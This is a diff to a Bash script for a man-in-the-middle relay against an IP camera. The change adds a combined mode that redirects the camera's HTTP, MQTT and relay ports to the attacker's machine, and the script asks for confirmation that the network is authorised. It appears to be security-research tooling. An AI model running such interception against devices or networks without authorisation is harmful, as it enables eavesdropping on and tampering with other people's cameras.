@@ -587,17 +587,22 @@ cmd_relay() {
     ok "camera achada: $CAM_IP"
   fi
 
-  DNAT_MODE=relay
+  DNAT_MODE="${DNAT_MODE:-relay}"
   mkdir -p "$OUT_DIR" "$RUN_DIR"
 
   echo "=================================================================="
-  echo " MITM RELAY-ONLY  ($OS)"
+  echo " MITM RELAY  ($OS)"
   echo "   camera   : $CAM_IP"
   echo "   gateway  : $GW_IP"
   echo "   atacante : $MY_IP  ($IFACE)"
   echo "   fake relay : :$RELAY_PORT"
-  echo "   DNAT     : so 29939-29942 -> ${DNAT_TARGET:-$MY_IP}:$RELAY_PORT"
-  echo "   MQTT/HTTP da camera continuam no cloud REAL"
+  if [[ "$DNAT_MODE" == "relay" ]]; then
+    echo "   DNAT     : so 29939-29942 -> ${DNAT_TARGET:-$MY_IP}:$RELAY_PORT"
+    echo "   MQTT/HTTP da camera continuam no cloud REAL"
+  else
+    echo "   DNAT     : 80 + 1883 + 29939-29942 -> ${DNAT_TARGET:-$MY_IP}"
+    echo "   MQTT/HTTP/relay da camera vao pro destino (modo combinado)"
+  fi
   echo "=================================================================="
   echo " So prosseguir se ESTE equipamento e ESTA rede sao teus / autorizados."
   read -r -p " Digitar 'SIM' para continuar: " CONFIRM
